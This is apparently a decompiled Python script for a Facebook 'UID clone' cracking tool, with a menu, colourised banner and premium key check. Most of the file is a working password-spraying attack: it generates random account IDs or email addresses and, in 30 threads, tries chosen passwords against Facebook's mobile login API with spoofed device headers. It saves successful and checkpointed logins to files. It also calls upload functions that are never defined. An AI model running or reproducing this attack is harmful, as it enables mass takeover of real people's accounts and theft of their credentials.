# Decompile  By Pr4mod-01

# Time Succes decompile : 2023-05-27 12:45:46.252763



W = '\033[97;1m' 

R = '\033[91;1m' 

G = '\033[92;1m' 

Y = '\033[93;1m' 

B = '\033[94;1m'

P = '\033[95;1m'

C = '\033[96;1m'

N = '\x1b[0m'







import os

try:

	import requests

except ImportError:

	os.system("pip install requests")



try:

	import concurrent.futures

except ImportError:

	os.system("pip install futures")



import os

import sys

import time

import requests

import random

import platform

import base64

import subprocess

from concurrent.futures import ThreadPoolExecutor





def runtxt(z):

    for e in z + "\n":

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)







def helpnote():

	print("%s [*] FOLLOW ME ON FB TO KNOW ABOUT UPDATES  :)"%(G))

	subprocess.check_output(["am", "start", "https://www.facebook.com/Pr4mod01"])

	exit(" [*] FACEBOOK :  https://www.facebook.com/Pr4mod01")





def notice():



 



	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")

	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))

	runtxt("\033[0;92m ADMIN FACEBOOK >> Pramod Chaulagain")

	subprocess.check_output(["am", "start", "https://www.facebook.com/Pr4mod01"])





        

plist = (platform.uname())[2]

basex = plist

basex1 = basex.encode('ascii')

basex2 = base64.b64encode(basex1)

basex3 = basex2.decode('ascii')

base4 = (basex3).upper()

basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')





class Main:

	def __init__(self):

		self.id = []

		self.ok = []

		self.cp = []

		self.loop = 0

		try:

			plr = requests.get('https://raw.githubusercontent.com/Pr4mod-01/H9R1/main/350.txt').text

			if basesplit in plr:

				key = basesplit

				stat = ("\033[0;92mP R E M I U M")

				FY = '\033[0;93m'

				FG = '\033[0;92m'

				GET = '\r'

			else:

				key = ("\033[0;91m -")

				stat = ("\033[0;91m FREE USER ")

				FY = '\033[0;90m'

				FG = '\033[0;90m'

				GET = '\033[0;92m [P] GET PREMIUM'

		except requests.exceptions.ConnectionError:

			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))

			exit()

		os.system("clear")

		

		print ("""\033[1;95m 
		
   ░█▀▀█ █▀▀█ ─█▀█─ █▀▄▀█ █▀▀█ █▀▀▄   █▀▀█ ▄█─ 
   ░█▄▄█ █▄▄▀ █▄▄█▄ █─▀─█ █──█ █──█   █▄▀█ ─█─ 
   ░█─── ▀─▀▀ ───█─ ▀───▀ ▀▀▀▀ ▀▀▀─   █▄▄█ ▄█▄
   


\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

     \033[1;92m➣ \033[1;92mDEVOLPER   :            Pr4mod
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Pramod Chaulagain 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            9745357164
     \033[1;96m➣ \033[1;92mGITHUB     :            Pr4mod-01
     \033[1;95m➣ \033[1;92mTOOLS      :            UID CLON

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

    """)

		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))

		print("%s [%sâ€¢%s] %sVERSION   : %s1.0"%(G,R,G,Y,G))

		print("%s [%sâ€¢%s] %sYOUR KEY  : %s%s"%(G,R,G,Y,G,key))

		print("%s [%sâ€¢%s] %sSTATUS    : %s"%(G,R,G,Y,stat)) 

		print("\n\x1b[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••  ")

		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s(FREE)"%(G,R,G,Y,W))

		print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V1"%(G,R,G,Y,G))

		print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V2"%(G,R,G,Y,G))

		print("%s [%s4%s]%s CRACK RANDOM FB ID 2004 %s(PRO) V3"%(G,R,G,Y,G))

		print("%s [%s5%s]%s CRACK FROM EMAILS %s(PRO)"%(G,R,G,Y,G))

		print("%s [%s6%s]%s CRACK RANDOM FB ID Custom %s(PRO) V1"%(G,R,G,Y,G))

		print(GET)

		hoga = input("\n%s [?] CHOICE : "%(Y))

		if hoga in ["", " "]:

			Main()

		elif hoga in ["1", "01"]:

			self.fbtua()

		elif hoga in ["2", "02"]:

			if basesplit in plr:

				self.old4_7()

			else: 

				notice()

				exit()

		elif hoga in ["3", "03"]:

#			if basesplit in plr:

				self.old4_6()

#			else: 

#				notice()

#				exit()

		elif hoga in ["4", "04"]:

			if basesplit in plr:

				self.old4_5()

			else: 

				notice()

				exit()

		elif hoga in ["5", "05"]:

			if basesplit in plr:

				self.email()

			else: 

				notice()

				exit()

		elif hoga in ["6","06"]:

			if basesplit in plr:

				self.oldcrack()

			else:

				notice()

				exit()

		elif hoga in ["P", "p"]:

			notice()

			exit()

		else:

			Main()



	def fbtua(self):

		x = 111111111

		xx = 999999999

		idx = "100000"

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;97m(5000 MAX): \033[0;92m"))

		if (limit)>5000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(G))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;96m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))



	def old_9(self):

		x = 111111

		xx = 999999

		idx = "100000000"

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(5000 MAX): \033[0;92m"))

		if (limit)>5000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,W,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

		

	def old4_7(self):

		x = 11111111

		xx = 99999999

		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR Pr4mod  "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))





	def old4_6(self):

		x = 1111111

		xx = 9999999

		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR MAHIDI "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G)) 

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		



	def old4_5(self):

		x = 111111

		xx = 999999

		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G))  

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))





	def email(self):

		x = 111

		xx = 999

		nam = input("%s [?] TYPE A NAME %s(EX:Pr4mod ): "%(Y,G))

		nam = nam.replace(" ", "")

		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))

		idx = input("%s DOMAIN  : "%(B))

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(5000 MAX): \033[0;92m"))

		if (limit)>5000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				___ = nam

				self.id.append(___+str(_)+__)

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR Pr4mod "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G)) 

				listpass = input(" [?] ENTER PASSWORD : ")

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

	def oldcrack(self):

		x = 11111111

		xx = 99999999

		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))

		if (limit)>10000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,951753"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		



	def api(self, uid, pwx):

		ua = random.choice([

			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 

			"Mozilla/5.0 (Linux; Android 10; Poco M3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])

		sys.stdout.write("\r %s\033[0;93m[>_] [Pr4mod] : \033[0;97m %s/%s -> \033[0;92m [Pr4mod -OK:%s ]- \033[0;93m[Pr4mod-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))

); sys.stdout.flush()

		for pw in pwx:

			pw = pw.lower()

			ses = requests.Session()

			headers = {

				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

				"x-fb-sim-hni": str(random.randint(20000, 40000)), 

				"x-fb-net-hni": str(random.randint(20000, 40000)), 

				"x-fb-connection-quality": "EXCELLENT",

				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",

				"user-agent": ua, 

				"content-type": "application/x-www-form-urlencoded", 

				"x-fb-http-engine": "Liger"

			}

			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 

			if "session_key" in response.text and "EAAA" in response.text:

				print("\r \033[0;92m[Pr4mod-OK] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [Pr4mod-OK] %s|%s\n"%(uid, pw))

				uploadoks()

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[0;93m[Pr4mod-CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [Pr4mod-CP] %s|%s\n"%(uid, pw))

				uploadcps()

				break

			else:

				continue



		self.loop +=1



if len(sys.argv) == 2:

	if sys.argv[1] == "--help" or sys.argv[1] == "-h":

		helpnote()

	else:

		Main()



try:Main()

except Exception as e:exit(str(e))



